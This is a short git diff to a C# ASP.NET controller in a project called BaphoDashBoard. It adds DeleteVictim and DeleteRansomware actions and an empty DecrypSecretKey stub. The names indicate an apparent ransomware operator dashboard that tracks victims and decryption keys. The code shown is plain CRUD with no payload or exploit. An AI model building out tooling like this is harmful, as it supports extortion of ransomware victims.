@@ -9,6 +9,7 @@ using System.Text;
 using BaphoDashBoard.DAL.Services;
 using BaphoDashBoard.ViewModels;
 using BaphoDashBoard.DTO;
+using Microsoft.AspNetCore.Http;
 
 namespace BaphoDashBoard.Controllers
 {
@@ -43,9 +44,17 @@ namespace BaphoDashBoard.Controllers
         }
 
         [HttpPost]
-        public async Task<IActionResult> Delete([FromBody] int id)
+        public async Task<IActionResult> DeleteVictim([FromBody] int id)
         {
-            var result = await _service.Delete(id);
+            var result = await _service.DeleteVictim(id);
+            return Json(result);
+        }
+
+
+        [HttpPost]
+        public async Task<IActionResult> DeleteRansomware([FromBody] int id)
+        {
+            var result = await _service.DeleteRansom(id);
             return Json(result);
         }
 
@@ -65,6 +74,20 @@ namespace BaphoDashBoard.Controllers
                 result.message = ex.Message;
             }
             return Json(result);
+        }
+
+        public async Task<AppResult> DecrypSecretKey([FromForm(Name = "fields")] IFormFile file)
+        {
+            AppResult result = new AppResult();
+            try
+            {
+
+            }
+            catch(Exception ex)
+            {
+
+            }
+            return result;
         }
 
     }
